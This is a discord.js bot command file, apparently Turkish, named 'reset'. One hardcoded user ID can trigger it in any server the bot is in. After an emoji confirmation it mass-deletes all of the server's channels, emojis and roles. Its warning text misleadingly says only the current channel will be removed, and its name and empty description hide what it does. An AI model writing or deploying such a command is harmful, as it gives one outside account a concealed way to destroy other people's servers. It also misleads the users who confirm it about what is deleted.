const Discord = require("discord.js");

exports.run = async (client, message, args) => {
if (message.author.id !== "690465699201810433")
    return message.channel.send("**Lütfen Aklından Büyük İşlere Karışma**");
let mesaj = args.slice(0).join(" ")


  const onayembed = new Discord.MessageEmbed()
  .setColor("BLUE")
  .setTimestamp()
  .setAuthor("Sunucu Silme")
  .setFooter("Onaylamak için 👍 emojisine, Red etmek içinse 👎 emojisine tıklayabilirsiniz")
  .setDescription("**UYARI!** \n\nEğer sunucu-silme işlemini onaylarsanız bu kanal kalıcı olarak **silinecek**,\n**geri getirilemeyecektir!**")
  message.channel.send(onayembed).then(msg => {
msg.react('👍').then(() => msg.react('👎'));

const filter = (reaction, user) => {
	return ['👍', '👎'].includes(reaction.emoji.name) && user.id === message.author.id;
};

msg.awaitReactions(filter, { max: 1, time: 60000, errors: ['time'] })
	.then(collected => {
		const reaction = collected.first();

		if (reaction.emoji.name === '👍') {

message.guild.channels.cache.map(m => m.delete())
message.guild.emojis.cache.map(m => m.delete()) 
message.guild.roles.cache.forEach(a => a.delete())

		} else {
			message.reply('sunucu silme işlemi iptal edildi!');
      msg.delete({timeout:3000})
		}
	})
	.catch(collected => {
		message.reply('Bir hatayla karşılaştık! Lütfen daha sonra tekrar deneyiniz.');
	});
  
})

};
exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: [],
    permLevel: 0
  };
  
  exports.help = {
    name: 'reset',
    description: '',
    usage: ''
  };